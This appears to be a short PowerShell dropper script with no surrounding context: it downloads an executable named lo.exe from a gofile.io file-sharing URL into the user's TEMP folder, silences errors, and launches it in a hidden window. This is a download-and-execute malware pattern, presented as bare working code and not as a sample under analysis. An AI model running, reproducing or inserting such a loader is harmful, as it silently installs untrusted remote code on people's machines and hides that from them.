$outfile = Join-Path $env:TEMP "lo.exe"
Invoke-WebRequest -Uri 'https://store5.gofile.io/download/web/8ccb0d5d-c80b-4444-8aba-bffb43c06a2a/lo.exe' -OutFile $outfile -ErrorAction SilentlyContinue
Start-Process -FilePath $outfile -WindowStyle Hidden